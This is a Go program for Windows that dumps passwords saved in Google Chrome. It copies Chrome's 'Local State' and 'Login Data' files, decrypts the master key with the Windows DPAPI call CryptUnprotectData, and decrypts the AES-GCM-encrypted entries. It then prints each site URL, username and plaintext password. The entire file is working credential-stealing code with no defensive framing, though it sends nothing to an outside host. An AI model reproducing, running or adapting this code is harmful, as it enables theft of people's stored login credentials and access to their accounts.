package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"database/sql"
	"log"
	"os"
	"syscall"
	"unsafe"
	_ "github.com/mattn/go-sqlite3"
	"github.com/bitly/go-simplejson"
	"io/ioutil"
	"bufio"
	"encoding/base64"
	"io"
)
const (
	CRYPTPROTECT_UI_FORBIDDEN = 0x1
)

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")
)




func main() {

	file := os.Getenv("LOCALAPPDATA")
	keyfile := file + "\\Google\\Chrome\\User Data\\Local State"
	file += "\\Google\\Chrome\\User Data\\Default\\Login Data"

	CopyFile(keyfile, keyfile + ".chromepass")
	CopyFile(file, file + ".chromepass")

	keyfile += ".chromepass"
	file += ".chromepass"


	_key := jsonkeyfile(keyfile)
	db, err := sql.Open("sqlite3", file)
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	rows, err := db.Query("select origin_url,username_value,password_value from logins")
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()
	for rows.Next() {
		var origin_url, username, passwdEncrypt string
		err = rows.Scan(&origin_url, &username, &passwdEncrypt)
		if err != nil {
			log.Fatal(err)
		}
		if passwdEncrypt[0:3] == "v10" || passwdEncrypt[0:3] == "v11"{
			dataout := Decrypt_v80_plus(_key,string(passwdEncrypt))
			if username != "" && passwdEncrypt != "" {
				fmt.Println(origin_url, "\nusername: " + username,"\npassword: " + string(dataout[:]) + "\n")
			}	
		}else{
			passwdByte := []byte(passwdEncrypt)
			dataout, _ := Decrypt(passwdByte)
			if username != "" && passwdEncrypt != "" {
				fmt.Println(origin_url, "\nusername: " + username,"\npassword: " + string(dataout[:]) + "\n")
			}	
		}
		
		
	}
	err = rows.Err()
	if err != nil {
		log.Fatal(err)
	}
}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func CopyFile(srcFileName string, dstFileName string) {
	srcFile, err := os.Open(srcFileName)
	if err != nil {
		fmt.Printf("open file err = %v\n", err)
		return
	}
	defer srcFile.Close()
	//通过srcFile，获取到Reader
	reader := bufio.NewReader(srcFile)
	//打开dstFileName
	dstFile, err := os.OpenFile(dstFileName, os.O_WRONLY | os.O_CREATE, 0666)
	if err != nil {
		fmt.Printf("open file err = %v\n", err)
		return
	}
	writer := bufio.NewWriter(dstFile)
	defer func() {
		writer.Flush() //把缓冲区的内容写入到文件
		dstFile.Close()

	}()

	io.Copy(writer, reader)
	return 
}


func jsonkeyfile(keyfile string) string{
	file,_ := os.Open(string(keyfile))
	data, err := ioutil.ReadAll(file)
	if err != nil{
		panic(err)
	}
	resjson, err := simplejson.NewJson([]byte(data))
	keys ,_:= resjson.Get("os_crypt").Get("encrypted_key").String()
	encrypted_key_with_header, _ := base64.StdEncoding.DecodeString(keys)
	// 去掉开头的DPAPI
	encrypted_key := encrypted_key_with_header[5:]
	_key,_ := Decrypt(encrypted_key)
	return string(_key)
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, CRYPTPROTECT_UI_FORBIDDEN, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func Decrypt_v80_plus(_key string,passwdEncrypt string) string{
    key := []byte(_key)
	passwdByte := []byte(passwdEncrypt)
	nonce, cipher_bytes := passwdByte[3:15], passwdByte[15:]
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}

	plaintext, err := aesgcm.Open(nil, nonce, cipher_bytes, nil)
	if err != nil {
		panic(err.Error())
	}
    return string(plaintext)
}
